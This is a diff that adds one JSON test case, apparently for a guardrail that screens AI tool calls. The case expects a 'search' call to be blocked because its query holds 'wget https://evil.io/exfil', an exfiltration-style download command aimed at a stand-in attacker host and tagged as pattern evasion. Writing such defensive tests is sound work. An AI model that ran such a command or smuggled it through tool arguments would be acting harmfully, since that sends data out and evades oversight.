@@ -1,0 +1,11 @@
+{
+  "id": "upload-regex-14",
+  "category": "upload-regex",
+  "toolName": "search",
+  "arguments": {
+    "q": "wget https://evil.io/exfil"
+  },
+  "ruleHint": "pattern-evasion",
+  "expected": "block",
+  "source": "uploaded-bypass"
+}
